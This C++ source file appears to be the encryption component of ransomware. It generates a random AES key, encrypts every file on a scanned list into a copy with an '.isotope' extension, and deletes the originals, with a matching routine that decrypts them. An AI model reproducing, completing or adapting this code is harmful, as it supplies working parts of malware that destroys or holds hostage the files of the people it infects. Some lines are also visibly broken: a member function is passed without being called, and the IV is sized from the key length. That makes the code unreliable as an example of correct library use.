#include "crypto.h"
#include "logger.h"
#include "filescan.h"

#include <Windows.h>

c_crypto::cryptkey c_crypto::key;

std::string c_crypto::base64_encode(std::string &input) 
{
	std::string result;
	CryptoPP::StringSource(input, true, new CryptoPP::Base64Encoder(new CryptoPP::StringSink(result)));
	return result;
}

std::string c_crypto::base64_decode(std::string &input) 
{
	std::string result;
	CryptoPP::StringSource(input, true, new CryptoPP::Base64Decoder(new CryptoPP::StringSink(result)));

	return result;
}

void c_crypto::encrypt_file(char* input, char* output) 
{	

	CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption e;
	e.SetKeyWithIV(c_crypto::key.enc_key, sizeof(c_crypto::key.enc_key), c_crypto::key.enc_iv);

	// Puts the 'f' object in scope of the statement meaning the deconstructor is fired before deletion
	// This needs to be done as the deconstructor closes the file stream.
	if(true)
		CryptoPP::FileSource f(input, true,
			new CryptoPP::StreamTransformationFilter(e,
			new CryptoPP::HexEncoder(new CryptoPP::FileSink(output))));

	DeleteFile(input);
}

void c_crypto::decrypt_file(char* input, char* output) 
{
	CryptoPP::CFB_Mode<CryptoPP::AES>::Decryption d;
	d.SetKeyWithIV(c_crypto::key.enc_key, sizeof(c_crypto::key.enc_key), c_crypto::key.enc_iv);

	// Puts the 'f' object in scope of the statement meaning the deconstructor is fired before deletion
	// This needs to be done as the deconstructor closes the file stream.
	if(true)
		CryptoPP::FileSource f(input, true,
			new CryptoPP::HexDecoder(new CryptoPP::StreamTransformationFilter(d, new CryptoPP::FileSink(output))));

	DeleteFile(input);
}

void c_crypto::make_keys() 
{
	c_crypto::random_bytes(AES_KEY_SIZE, c_crypto::key.enc_key);
	c_crypto::random_bytes(AES_KEY_SIZE, c_crypto::key.enc_iv);
}

void c_crypto::random_bytes(const int &amount, unsigned char *result) 
{
	CryptoPP::AutoSeededRandomPool rng;
	rng.GenerateBlock(result, amount);
}

void c_crypto::encrypt_all()
{
	for (int i = 0; i < c_filescan::files.size(); i++)
	{
		std::string new_file = c_filescan::files[i].u8string() + ".isotope";
		c_crypto::encrypt_file(c_filescan::files[i].u8string, (char*)new_file.c_str());
	}
}

void c_crypto::decrypt_all()
{
	for (int i = 0; i < c_filescan::files.size(); i++)
	{
		std::string old_file = c_filescan::files[i].u8string() + ".isotope";
		c_crypto::decrypt_file((char*)old_file.c_str(), c_filescan::files[i].u8string);
	}
}